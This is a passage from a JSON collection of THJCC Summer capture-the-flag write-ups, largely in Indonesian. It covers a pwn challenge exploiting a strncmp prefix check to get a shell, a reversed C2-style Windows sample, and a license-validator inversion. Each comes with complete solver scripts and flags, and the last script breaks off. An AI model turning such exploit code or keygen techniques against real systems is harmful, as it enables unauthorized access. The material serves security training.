b\"THJCC{\" not in data:\r\n        raise RuntimeError(\"system handler did not execute shell command\")\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n    io.interactive()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-verysecurityshell",
    "title": "VSS",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge VSS",
    "problemDescription": "Binary `chal` menjalankan \"very security shell\". Saat start, program membuat password 16 karakter dari `/dev/urandom`, lalu meminta input user. Kalau input dianggap benar, program menjalankan `/bin/sh`.\n\nBug-nya ada di validasi password. Program tidak membandingkan input dengan 16 karakter password penuh, tapi memakai panjang input user:\n\n```c\nstrncmp(input, password, strlen(input))\n```\n\nAkibatnya, input 1 karakter akan diterima kalau karakter itu sama dengan karakter pertama password. Karena program mengulang prompt saat salah dan password tidak digenerate ulang selama koneksi yang sama, kita bisa brute force 94 printable character dalam satu koneksi.",
    "tools": [],
    "analysis": "String penting dari binary:\n\n```\n/dev/urandom\nWelcome to very security shell\nplease input your password:\n%16s\nWrong password.\nYou input the right password, welcome!\n/bin/sh\n```\n\nProgram membaca 16 byte dari `/dev/urandom`, lalu setiap byte dimapping ke alphabet printable ASCII non-space.\n\nFungsi generator password:\n\n- buka `/dev/urandom`\n- baca 16 byte\n- tiap byte dimodulo `0x5e` atau 94\n- hasilnya dipakai sebagai indeks alphabet printable\n- password diberi null terminator di byte ke-17\n\nFungsi main:\n\n```c\nscanf(\"%16s\", input);\nlen = strlen(input);\nif (len <= 0) wrong;\nif (strncmp(input, password, len) == 0) {\n    puts(\"You input the right password, welcome!\");\n    system(\"/bin/sh\");\n}\n```\n\nKesalahan ada pada argumen ketiga `strncmp`. Seharusnya program membandingkan 16 byte penuh atau memakai `strcmp` setelah memastikan panjang input tepat 16.\n\nTest lokal menunjukkan cukup brute force 1 karakter. Saat salah, program mencetak `Wrong password.` dan kembali meminta password yang sama. Saat benar, program spawn `/bin/sh`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "Isi ZIP:\n\n```\nDockerfile\nflag.txt\nchal\ndocker-compose.yml\n```\n\n`chal` adalah ELF 64-bit PIE stripped. Proteksi stack canary aktif, tetapi tidak perlu bypass karena bug-nya logic bug, bukan overflow."
      },
      {
        "title": "Algoritma Exploit",
        "content": "1. Connect ke service.\n2. Baca banner sampai prompt password.\n3. Kirim semua karakter alphabet satu per satu:\n\n```\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~\n```\n\n4. Kalau output mengandung `right password`, shell sudah aktif.\n5. Kirim command, default:\n\n```\ncat flag.txt; cat /flag 2>/dev/null\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "Remote:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```\nYou input the right password, welcome!\n[+] matched first password character: '&'\nTHJCC{strnc0mp_1s_n0t_s3cur3}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver for THJCC VSS.\r\n\r\nBug:\r\n  Password is 16 random printable chars, but the check is:\r\n      strncmp(user_input, password, strlen(user_input))\r\n  So a one-character prefix is enough. The service loops on wrong guesses,\r\n  and the password stays the same during the same connection. Try all 94\r\n  non-space printable characters until the first character matches, then use\r\n  the spawned /bin/sh to read the flag.\r\n\"\"\"\r\nimport argparse\r\nimport os\r\nimport select\r\nimport socket\r\nimport subprocess\r\nimport sys\r\nimport time\r\nfrom typing import Optional\r\n\r\nHOST = \"chal.thjcc.org\"\r\nPORT = 11039\r\n\r\n# Exact alphabet used by the binary: ASCII printable except space.\r\nALPHABET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\\'()*+,-./:;<=>?@[\\\\]^_`{|}~'\r\n\r\n\r\nclass RemoteTube:\r\n    def __init__(self, host: str, port: int, timeout: float = 10.0):\r\n        self.sock = socket.create_connection((host, port), timeout=timeout)\r\n        self.sock.setblocking(False)\r\n\r\n    def send(self, data: bytes) -> None:\r\n        self.sock.sendall(data)\r\n\r\n    def recv_some(self) -> bytes:\r\n        try:\r\n            return self.sock.recv(65536)\r\n        except BlockingIOError:\r\n            return b\"\"\r\n\r\n    def close(self) -> None:\r\n        try:\r\n            self.sock.close()\r\n        except Exception:\r\n            pass\r\n\r\n\r\nclass LocalTube:\r\n    def __init__(self, binary: str):\r\n        self.proc = subprocess.Popen(\r\n            [binary],\r\n            stdin=subprocess.PIPE,\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.STDOUT,\r\n            cwd=os.path.dirname(os.path.abspath(binary)) or \".\",\r\n        )\r\n\r\n    def send(self, data: bytes) -> None:\r\n        assert self.proc.stdin is not None\r\n        self.proc.stdin.write(data)\r\n        self.proc.stdin.flush()\r\n\r\n    def recv_some(self) -> bytes:\r\n        assert self.proc.stdout is not None\r\n        fd = self.proc.stdout.fileno()\r\n        r, _, _ = select.select([fd], [], [], 0)\r\n        if not r:\r\n            return b\"\"\r\n        try:\r\n            return os.read(fd, 65536)\r\n        except OSError:\r\n            return b\"\"\r\n\r\n    def close(self) -> None:\r\n        try:\r\n            self.proc.kill()\r\n        except Exception:\r\n            pass\r\n\r\n\r\ndef recv_for(tube, seconds: float) -> bytes:\r\n    data = b\"\"\r\n    end = time.time() + seconds\r\n    while time.time() < end:\r\n        chunk = tube.recv_some()\r\n        if chunk:\r\n            data += chunk\r\n            # extend a little so split TCP packets are collected\r\n            end = max(end, time.time() + 0.05)\r\n        else:\r\n            time.sleep(0.01)\r\n    return data\r\n\r\n\r\ndef recv_until(tube, needle: bytes, timeout: float = 5.0) -> bytes:\r\n    data = b\"\"\r\n    end = time.time() + timeout\r\n    while time.time() < end:\r\n        chunk = tube.recv_some()\r\n        if chunk:\r\n            data += chunk\r\n            if needle in data:\r\n                return data\r\n        else:\r\n            time.sleep(0.01)\r\n    return data\r\n\r\n\r\ndef solve(tube, command: str) -> bytes:\r\n    banner = recv_until(tube, b\"password:\", timeout=5.0)\r\n    sys.stderr.write(banner.decode(\"latin1\", errors=\"replace\"))\r\n\r\n    hit: Optional[str] = None\r\n\r\n    for ch in ALPHABET:\r\n        sys.stderr.write(f\"[*] trying prefix {ch!r}\\n\")\r\n        tube.send(ch.encode() + b\"\\n\")\r\n        out = recv_for(tube, 0.20)\r\n\r\n        if b\"right password\" in out:\r\n            hit = ch\r\n            sys.stderr.write(out.decode(\"latin1\", errors=\"replace\"))\r\n            break\r\n\r\n        # Normal wrong response loops back to the same password prompt.\r\n        if b\"Wrong password\" not in out and out:\r\n            sys.stderr.write(out.decode(\"latin1\", errors=\"replace\"))\r\n\r\n    if hit is None:\r\n        raise RuntimeError(\"failed to find one-byte prefix; service behavior changed?\")\r\n\r\n    sys.stderr.write(f\"[+] matched first password character: {hit!r}\\n\")\r\n\r\n    if not command.endswith(\"\\n\"):\r\n        command += \"\\n\"\r\n\r\n    # system('/bin/sh') is running now. Send command to the shell.\r\n    tube.send(command.encode())\r\n    return recv_for(tube, 2.0)\r\n\r\n\r\ndef main() -> None:\r\n    ap = argparse.ArgumentParser()\r\n    ap.add_argument(\"--host\", default=HOST)\r\n    ap.add_argument(\"--port\", default=PORT, type=int)\r\n    ap.add_argument(\"--local\", action=\"store_true\")\r\n    ap.add_argument(\"--binary\", default=\"./chal\")\r\n    ap.add_argument(\"--cmd\", default=\"cat flag.txt; cat /flag 2>/dev/null\")\r\n    args = ap.parse_args()\r\n\r\n    tube = LocalTube(args.binary) if args.local else RemoteTube(args.host, args.port)\r\n    try:\r\n        out = solve(tube, args.cmd)\r\n        print(out.decode(\"latin1\", errors=\"replace\"), end=\"\")\r\n    finally:\r\n        tube.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{strnc0mp_1s_n0t_s3cur3}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-rev-blackfrost",
    "title": "BlackFrost",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge BlackFrost",
    "problemDescription": "Flag tidak muncul sebagai string utuh. Binary Windows membaca argumen `--token`, menghitung FNV-1a 32-bit, lalu memakai nilai `0xb700b632` sebagai seed. PCAP pendamping berisi transcript local replay: client mengirim `BFHELLO b700b632`, lalu server membalas `BF2:<hex>`.\n\nPayload BF2 bukan flag langsung. Hex tersebut harus di-decode dengan stream XOR yang sama seperti loop decoder di binary. Hasil decode adalah konfigurasi yang membuka jalur output flag:\n\n```\ncampaign=BLACKFROST-26;nonce=4c2f17;directive=collect-only;\n```\n\nSetelah marker konfigurasi cocok, binary mendecode blob kecil di `.rdata` dan menulis hasilnya ke stdout. Blob itu menghasilkan flag:\n\n```\nTHJCC{blackfrost_config_recovered}\n```",
    "tools": [],
    "analysis": "`strings` pada EXE menunjukkan beberapa string penting:\n\n```\nBFHELLO \n00000000\nWWWWWWWW\nsandbox timeout\nC2 unavailable; start the local replay server\nconfiguration rejected\nhandshake rejected\nstage unpack failed\nanalysis mode disabled\nusage: BlackFrost.exe --token <token>\n127.0.0.1\n```\n\n`strings` pada PCAP langsung memberi dua artefak utama:\n\n```\nBFHELLO b700b632\nBF2:0bbc114acd70a708ed0748e357ca0ebc179ed807ae3feb38afdb77f739c53bec2e0cab21e810922353d14df411dc0ba1d441c96988449fd84cec0f\n```\n\nEntry point berada di `0x1400010d0`.\n\nBagian awal melakukan anti-debug sederhana:\n\n```asm\ncall IsDebuggerPresent\n```\n\nJika debugger terdeteksi, program menulis:\n\n```\nanalysis mode disabled\n```\n\nProgram lalu mencari argumen:\n\n```\n--token <token>\n```\n\nToken disalin sampai whitespace, kemudian panjangnya harus 16 byte. Setelah itu token di-hash memakai FNV-1a 32-bit:\n\n```asm\nmov r14d, 0x811c9dc5\nxor eax, r14d\nimul r14d, eax, 0x1000193\ncmp r14d, 0xb700b632\n```\n\nTarget hash-nya:\n\n```\n0xb700b632\n```\n\nNilai ini sama dengan seed yang muncul di PCAP pada pesan:\n\n```\nBFHELLO b700b632\n```\n\nEXE tidak perlu dijalankan di Linux. PCAP sudah berisi replay traffic yang dibutuhkan binary.\n\nLoop network binary melakukan alur ini:\n\n1. connect ke `127.0.0.1:31337`\n2. kirim handshake `BFHELLO <seed>`\n3. terima balasan `BF2:<hex>`\n4. cari prefix `BF2:`\n5. decode hex menjadi byte\n6. XOR byte hasil decode dengan seed dan konstanta berjalan\n7. validasi marker konfigurasi\n8. decode dan print flag blob\n\nPort `31337` berasal dari immediate `0x7a69` yang dipakai sebelum `htons()`. Nilai little-endian itu menghasilkan port `0x697a = 27002` jika dibaca mentah sebagai word di memori, tetapi immediate register yang dipakai oleh `htons` adalah `0x7a69`, sehingga koneksi disiapkan dari konstanta tersebut. Karena PCAP sudah cukup untuk ekstraksi, solve script tidak perlu membuka socket.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```\nBlackFrost.exe   PE32+ executable for MS Windows, x86-64, console\ntraffic(1).pcap  pcap capture file, Ethernet\n```\n\nBinary kecil, hanya punya dua section utama:\n\n```\n.text   kode program\n.rdata  konstanta, string status, import table, blob terenkripsi\n```\n\nImport penting:\n\n```\nGetCommandLineA\nGetTickCount\nIsDebuggerPresent\nVirtualAlloc\nVirtualFree\nWriteFile\nWSAStartup\nsocket\nconnect\nsend\nrecv\n```\n\nIni cocok dengan deskripsi challenge: binary Windows memakai local C2/replay di `127.0.0.1`."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Decoder BF2 berada di sekitar loop setelah pencarian prefix `BF2:`. Tiap dua karakter hex diubah menjadi satu byte cipher. Byte plaintext dihitung seperti ini:\n\n```\nplain[i] = cipher[i] ^ ((seed >> ((i * 8) & 0x18)) & 0xff) ^ ((0x5a + 0x11 * i) & 0xff)\n```\n\nDengan seed dari PCAP:\n\n```\nseed = 0xb700b632\n```\n\nPayload BF2 terdecode menjadi:\n\n```\ncampaign=BLACKFROST-26;nonce=4c2f17;directive=collect-only;\n```\n\nBinary mengecek marker berikut:\n\n```\ncampaign=BLACKFROST-26;\nnonce=4c2f17;\ndirective=collect-only;\n```\n\nSetelah marker cocok, jalur sukses menuju loop di `0x140001777`. Loop ini mendecode blob di `.rdata` VA `0x140003080` sepanjang 34 byte.\n\nBlob terenkripsi:\n\n```\n4d 6e 79 03 0e 21 05 18 e0 ed f0 ce c7 ad bc a8\nb6 95 6c 7e 7b 43 50 1b 23 3b 08 17 f3 f7 ed c9\ndd bb\n```\n\nDecoder flag:\n\n```python\nkey = 0x26\nfor i in range(0, 34, 2):\n    out.append(blob[i] ^ ((key - 0x0d) & 0xff))\n    out.append(blob[i + 1] ^ key)\n    key = (key + 0x1a) & 0xff\n```\n\nHasilnya:\n\n```\nTHJCC{blackfrost_config_recovered}\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` melakukan tiga hal:\n\n1. Ambil seed `b700b632` dan payload BF2 dari `traffic(1).pcap`.\n2. Decode payload BF2, lalu pastikan tiga marker konfigurasi benar.\n3. Ambil blob flag dari `BlackFrost.exe` RVA `0x3080`, decode dengan loop XOR, lalu print flag.\n\nScript juga punya parser section PE sederhana supaya RVA `0x3080` dipetakan ke file offset `.rdata` secara benar. Pada file ini, offset akhirnya adalah:\n\n```\n0x1680\n```"
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\ncd /mnt/data\npython3 solve.py\n```\n\nOutput:\n\n```\n[+] seed from BFHELLO: 0xb700b632\n[+] decoded BF2 config: campaign=BLACKFROST-26;nonce=4c2f17;directive=collect-only;\n[+] flag blob file offset: 0x1680\n[+] flag: THJCC{blackfrost_config_recovered}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport re\r\nimport struct\r\n\r\nEXE_PATH = Path(\"BlackFrost.exe\")\r\nPCAP_PATH = Path(\"traffic.pcap\")\r\n\r\n# Disassembly shows the encrypted flag blob is read from VA 0x140003080.\r\n# The image base in this PE is 0x140000000, so the RVA is 0x3080.\r\nFLAG_BLOB_RVA = 0x3080\r\nFLAG_BLOB_LEN = 34\r\n\r\nREQUIRED_MARKERS = (\r\n    b\"campaign=BLACKFROST-26;\",\r\n    b\"nonce=4c2f17;\",\r\n    b\"directive=collect-only;\",\r\n)\r\n\r\n\r\ndef rva_to_offset(pe: bytes, rva: int) -> int:\r\n    \"\"\"Map a PE RVA to file offset using the section table.\"\"\"\r\n    if pe[:2] != b\"MZ\":\r\n        raise ValueError(\"not a PE/MZ file\")\r\n\r\n    pe_off = struct.unpack_from(\"<I\", pe, 0x3C)[0]\r\n    if pe[pe_off:pe_off + 4] != b\"PE\\0\\0\":\r\n        raise ValueError(\"invalid PE signature\")\r\n\r\n    number_of_sections = struct.unpack_from(\"<H\", pe, pe_off + 6)[0]\r\n    size_of_optional_header = struct.unpack_from(\"<H\", pe, pe_off + 20)[0]\r\n    section_table = pe_off + 24 + size_of_optional_header\r\n\r\n    for i in range(number_of_sections):\r\n        off = section_table + 40 * i\r\n        name = pe[off:off + 8].rstrip(b\"\\0\")\r\n        virtual_size, virtual_address, raw_size, raw_ptr = struct.unpack_from(\"<IIII\", pe, off + 8)\r\n        span = max(virtual_size, raw_size)\r\n        if virtual_address <= rva < virtual_address + span:\r\n            return raw_ptr + (rva - virtual_address)\r\n\r\n    raise ValueError(f\"RVA 0x{rva:x} is not inside any section\")\r\n\r\n\r\ndef decrypt_bf2(hex_payload: str, seed: int) -> bytes:\r\n    \"\"\"Reverse the BF2 packet decoder used by BlackFrost.exe.\"\"\"\r\n    cipher = bytes.fromhex(hex_payload)\r\n    out = bytearray()\r\n    add_key = 0x5A\r\n\r\n    for i, b in enumerate(cipher):\r\n        # Assembly uses (r8d & 0x18) as shift count, with r8 += 8 each byte.\r\n        seed_byte = (seed >> ((i * 8) & 0x18)) & 0xFF\r\n        out.append(b ^ seed_byte ^ (add_key & 0xFF))\r\n        add_key = (add_key + 0x11) & 0xFFFFFFFF\r\n\r\n    return bytes(out)\r\n\r\n\r\ndef decrypt_flag_blob(blob: bytes) -> str:\r\n    \"\"\"Reverse the small XOR loop at 0x140001777.\"\"\"\r\n    if len(blob) != FLAG_BLOB_LEN:\r\n        raise ValueError(\"unexpected flag blob length\")\r\n\r\n    out = bytearray()\r\n    key = 0x26\r\n\r\n    for i in range(0, FLAG_BLOB_LEN, 2):\r\n        out.append(blob[i] ^ ((key - 0x0D) & 0xFF))\r\n        out.append(blob[i + 1] ^ key)\r\n        key = (key + 0x1A) & 0xFF\r\n\r\n    return out.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    pe = EXE_PATH.read_bytes()\r\n    pcap = PCAP_PATH.read_bytes()\r\n\r\n    hello = re.search(rb\"BFHELLO\\s+([0-9a-fA-F]{8})\", pcap)\r\n    bf2 = re.search(rb\"BF2:([0-9a-fA-F]+)\", pcap)\r\n    if not hello or not bf2:\r\n        raise RuntimeError(\"BFHELLO/BF2 transcript not found in pcap\")\r\n\r\n    seed = int(hello.group(1), 16)\r\n    config = decrypt_bf2(bf2.group(1).decode(\"ascii\"), seed)\r\n\r\n    print(f\"[+] seed from BFHELLO: 0x{seed:08x}\")\r\n    print(f\"[+] decoded BF2 config: {config.decode('ascii')}\")\r\n\r\n    missing = [m for m in REQUIRED_MARKERS if m not in config]\r\n    if missing:\r\n        raise RuntimeError(f\"decoded config is missing marker(s): {missing!r}\")\r\n\r\n    flag_off = rva_to_offset(pe, FLAG_BLOB_RVA)\r\n    flag_blob = pe[flag_off:flag_off + FLAG_BLOB_LEN]\r\n    flag = decrypt_flag_blob(flag_blob)\r\n\r\n    print(f\"[+] flag blob file offset: 0x{flag_off:x}\")\r\n    print(f\"[+] flag: {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{blackfrost_config_recovered}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-rev-license",
    "title": "License",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge License",
    "problemDescription": "`license_v2` adalah ELF 64-bit x86-64, statically linked, stripped, dan sangat kecil. Binary menerima satu argumen license. Input yang lolos format dipermutasi, ditransformasi per byte, lalu melewati empat round affine berbasis XOR dan rotate. Hasil 24 byte akhirnya dibandingkan dengan konstanta hardcoded.\n\nPipeline validator bisa dimodelkan sebagai sistem linear/affine 192 bit setelah tahap pre-transform. Rank sistemnya 178, jadi hanya ada 14 free bit. Semua 16.384 kemungkinan solusi affine dapat dienumerasi, lalu difilter dengan constraint bahwa karakter input asli harus berupa hex digit. Hasilnya tepat satu license valid.\n\nLicense valid:\n\n```\nA9F3-1C7D-EE42-0B6A-5D91-7F20\n```\n\nMenjalankan binary dengan license tersebut menghasilkan:\n\n```\nTHJCC{license_pipeline_rebuilt}\n```",
    "tools": [],
    "analysis": "`strings` langsung memperlihatkan string kegagalan dan usage:\n\n```bash\nstrings -a license_v2\n```\n\nPotongan hasil:\n\n```\ninvalid license\nusage: %s <license>\n```\n\nFlag tidak tersimpan sebagai plaintext.\n\nDump `.rodata` memperlihatkan beberapa konstanta SIMD, permutation table, string error, dan blob byte acak:\n\n```bash\nobjdump -s -j .rodata license_v2\n```\n\nData penting:\n\n```\n0x2001f0: 07 00 13 04 0c 17 02 10 09 05 15 0b 01 0e 12 06\n0x200200: 14 03 0f 0a 08 16 0d 11\n\n0x200210: 25 36 c1 db e6 c9 d3 a5 ba 83 9d 73 68 45 57 5d\n0x200220: 31 2b 37 01 1b e7 d0 ee cc d4 b6 b9 b1 9e 8a\n```\n\n### Format input\n\nValidasi dimulai di `0x201230`.\n\nBinary mengecek `argc == 2`, lalu menghitung panjang `argv[1]`. Hasil panjang harus 29 karakter.\n\nPada loop berikutnya, posisi separator dipaksa menjadi `-`. Posisi yang valid adalah:\n\n```\n4, 9, 14, 19, 24\n```\n\nJadi format license adalah enam grup berisi empat karakter:\n\n```\nXXXX-XXXX-XXXX-XXXX-XXXX-XXXX\n```\n\nKarakter selain separator harus berada di salah satu range:\n\n```\n0-9\nA-F\na-f\n```\n\nSetelah separator dibuang, tersisa tepat 24 karakter.\n\n### Checksum decoy\n\nDi `0x201398` ada state awal:\n\n```\n0x31415926\n```\n\nProgram melakukan XOR dengan `index * char` dan rotate 32-bit untuk seluruh 24 karakter. Tetapi nilai akhirnya tidak dipakai dalam keputusan validasi berikutnya; register hasil segera ditimpa. Bagian ini berfungsi sebagai decoy.\n\n### Permutasi\n\nPermutation table berada di `.rodata` `0x2001f0`:\n\n```python\nPERM = [\n    7, 0, 19, 4, 12, 23, 2, 16,\n    9, 5, 21, 11, 1, 14, 18, 6,\n    20, 3, 15, 10, 8, 22, 13, 17,\n]\n```\n\nJika 24 karakter tanpa dash disebut `raw`, maka byte ke-j berikutnya berasal dari:\n\n```\nraw[PERM[j]]\n```\n\n### Pre-transform per byte\n\nBagian `0x201410..0x2016e5` memakai SSE untuk 16 byte awal. Delapan byte sisanya dikerjakan secara scalar di `0x2016eb..0x201766`.\n\nKeduanya merepresentasikan formula yang sama:\n\n```python\ny[j] = rol8(\n    raw[PERM[j]] ^ ((0x31 + 0x11*j) & 0xff),\n    j % 5\n)\ny[j] = (y[j] + 0x0b*j) & 0xff\n```\n\nScalar tail membuat pola ini lebih mudah terlihat. Contohnya untuk `j=16`:\n\n```asm\nxor al, 0x41\nrol al, 1\nadd al, 0xb0\n```\n\nNilai tersebut cocok dengan:\n\n```\n0x31 + 0x11*16 = 0x141 -> 0x41\n16 mod 5 = 1\n0x0b*16 = 0xb0\n```\n\n### Empat round validator\n\nSetelah pre-transform, state berukuran 24 byte diproses empat kali.\n\nSetiap round mengikuti bentuk:\n\n```python\nv = state[i] ^ state[(i + 7) % 24]\nv ^= (i + 0x1d*r) & 0xff\nv ^= ROUND_KEYS[r][i % 4]\nout[i] = rol8(v, (i + r) % 7)\n```\n\nRound key yang berasal dari immediate 32-bit di assembly:\n\n```python\nROUND_KEYS = [\n    [0xdf, 0x9b, 0x57, 0x13],  # 0x13579bdf\n    [0xe0, 0xac, 0x68, 0x24],  # 0x2468ace0\n    [0x0d, 0xf0, 0xad, 0x0b],  # 0x0badf00d\n    [0xaa, 0x55, 0xaa, 0x55],  # 0x55aa55aa\n]\n```\n\nMagic division dengan `0x2492492492492493` hanya dipakai untuk menghitung modulo 7 tanpa instruksi division. Setelah disederhanakan, rotate count masing-masing round memang `(i + r) % 7`.\n\n### Target final\n\nMulai `0x201a34`, 24 output byte dibandingkan satu per satu dengan konstanta:\n\n```\n95 54 0c 2f 5a c7 a9 9f\nbc a4 9a d2 96 c3 2d 88\n3a 57 8b ad 1d 2f 2b 46\n```\n\nJika salah satu byte tidak cocok, eksekusi masuk ke jalur:\n\n```\ninvalid license\n```\n\nJika semuanya cocok, kontrol masuk ke `0x201bc3`, yaitu decoder flag.\n\nBinary bisa diuji langsung dengan input format yang salah:\n\n```bash\n./license_v2 11111111111111111111111111111\n```\n\nHasil:\n\n```\ninvalid license\n```\n\nSetelah solver mendapatkan license valid:\n\n```bash\n./license_v2 A9F3-1C7D-EE42-0B6A-5D91-7F20\n```\n\nHasil nyata dari binary:\n\n```\nTHJCC{license_pipeline_rebuilt}\n```\n\nExit code binary adalah 0.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "```bash\nfile license_v2\n```\n\nHasil:\n\n```\nlicense_v2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n```\n\nUkuran file hanya sekitar 3.6 KB. Section yang relevan hanya `.rodata` dan `.text`.\n\n```bash\nreadelf -S license_v2\n```\n\nBagian penting:\n\n```\n.rodata  0x200120\n.text    0x201230\n```\n\nTidak ada symbol table karena binary sudah stripped."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Empat round setelah pre-transform hanya terdiri dari XOR, pemilihan byte tetangga, dan rotate bit. Semua operasi tersebut affine terhadap 192 bit state.\n\nSaya membangun transformasi linear dengan metode basis-vector:\n\n1. Jalankan pipeline pada state nol untuk mendapatkan affine offset.\n2. Untuk setiap 192 input bit, toggle satu bit lalu jalankan pipeline.\n3. XOR output dengan affine offset untuk mendapatkan satu kolom matriks linear.\n4. Susun sistem `A*x = target XOR offset` di GF(2).\n5. Lakukan Gaussian elimination.\n\nRank matriks adalah:\n\n```\n178\n```\n\nDengan 192 variabel, nullity-nya:\n\n```\n192 - 178 = 14\n```\n\nArtinya hanya ada:\n\n```\n2^14 = 16384\n```\n\nstate pre-transform yang perlu dicoba.\n\nSetiap kandidat kemudian difilter berdasarkan constraint byte pre-transform. Karena byte sebelum pre-transform harus berasal dari karakter hex yang valid, setiap posisi hanya punya 22 kemungkinan karakter:\n\n```\n0123456789ABCDEFabcdef\n```\n\nSetelah filtering, hanya satu kandidat yang tersisa:\n\n```\nA9F3-1C7D-EE42-0B6A-5D91-7F20\n```"
      },
      {
        "title": "Decoder Flag",
        "content": "Flag tidak disimpan plaintext. Blob di `0x200210` berisi 31 byte:\n\n```\n25 36 c1 db e6 c9 d3 a5 ba 83 9d 73 68 45 57 5d\n31 2b 37 01 1b e7 d0 ee cc d4 b6 b9 b1 9e 8a\n```\n\nJalur sukses memulai state byte:\n\n```\ncl = 0x7e\n```\n\nByte diproses berpasangan:\n\n```python\nout[j]   = blob[j]   ^ ((cl - 0x0d) & 0xff)\nout[j+1] = blob[j+1] ^ cl\ncl = (cl + 0x1a) & 0xff\n```\n\nHasil decoding:\n\n```\nTHJCC{license_pipeline_rebuilt}\n```"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` tidak memakai Z3, angr, atau dependency eksternal. Solver:\n\n1. Mereproduksi pre-transform dan empat round.\n2. Membangun matriks affine 192-bit secara otomatis.\n3. Menyelesaikannya dengan Gaussian elimination GF(2).\n4. Mengenumerasi 14 free bit.\n5. Memfilter kandidat berdasarkan alfabet hex.\n6. Mengembalikan satu license valid.\n7. Mendekode blob flag dari success path.\n8. Menjalankan `license_v2` dengan license hasil solver jika binary executable tersedia.\n9. Memastikan output binary sama dengan flag hasil decoding."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nchmod +x license_v2 solve.py\n./solve.py\n```\n\nOutput:\n\n```\n[+] license: A9F3-1C7D-EE42-0B6A-5D91-7F20\n[+] decoded success flag: THJCC{license_pipeline_rebuilt}\n[+] binary output: THJCC{license_pipeline_rebuilt}\n[+] binary exit code: 0\n<FLAG>THJCC{license_pipeline_rebuilt}</FLAG>\n```\n\nBisa juga diverifikasi manual:\n\n```bash\n./license_v2 A9F3-1C7D-EE42-0B6A-5D91-7F20\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for the License REV challenge.\r\n\r\nNo external dependencies are required. The script reconstructs the affine\r\n4-round validator, solves the resulting GF(2) system, filters candidates by\r\nthe original hexadecimal input alphabet, rebuilds the dashed license, then\r\ndecodes the success-path flag blob.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport os\r\nimport subprocess\r\n\r\nN = 24\r\n\r\n# .rodata @ 0x2001f0: order used before the per-byte pre-transform.\r\nPERM = [\r\n    0x07, 0x00, 0x13, 0x04, 0x0C, 0x17, 0x02, 0x10,\r\n    0x09, 0x05, 0x15, 0x0B, 0x01, 0x0E, 0x12, 0x06,\r\n    0x14, 0x03, 0x0F, 0x0A, 0x08, 0x16, 0x0D, 0x11,\r\n]\r\n\r\n# Final 24-byte validator target from comparisons at 0x201a34..0x201bba.\r\nTARGET = bytes.fromhex(\r\n    \"95540c2f5ac7a99fbca49ad296c32d883a578bad1d2f2b46\"\r\n)\r\n\r\n# Low byte selected from each 32-bit round constant according to i % 4.\r\nROUND_KEYS = [\r\n    [0xDF, 0x9B, 0x57, 0x13],  # 0x13579bdf\r\n    [0xE0, 0xAC, 0x68, 0x24],  # 0x2468ace0\r\n    [0x0D, 0xF0, 0xAD, 0x0B],  # 0x0badf00d\r\n    [0xAA, 0x55, 0xAA, 0x55],  # 0x55aa55aa\r\n]\r\n\r\n# Success-path encoded bytes from .rodata @ 0x200210.\r\nFLAG_BLOB = bytes.fromhex(\r\n    \"2536c1dbe6c9d3a5ba839d736845575d312b37011be7d0eeccd4b6b9b19e8a\"\r\n)\r\n\r\nHEX_CHARS = b\"0123456789ABCDEFabcdef\"\r\n\r\n\r\ndef rol8(x: int, r: int) -> int:\r\n    r &= 7\r\n    if not r:\r\n        return x & 0xFF\r\n    return ((x << r) | (x >> (8 - r))) & 0xFF\r\n\r\n\r\ndef pre_transform_byte(c: int, j: int) -> int:\r\n    \"\"\"Per-byte transform applied after the 24-byte permutation.\r\n\r\n    Recovered from the vectorized block at 0x201410..0x2016e5 and the scalar\r\n    tail at 0x2016eb..0x201766.\r\n    \"\"\"\r\n    xor_key = 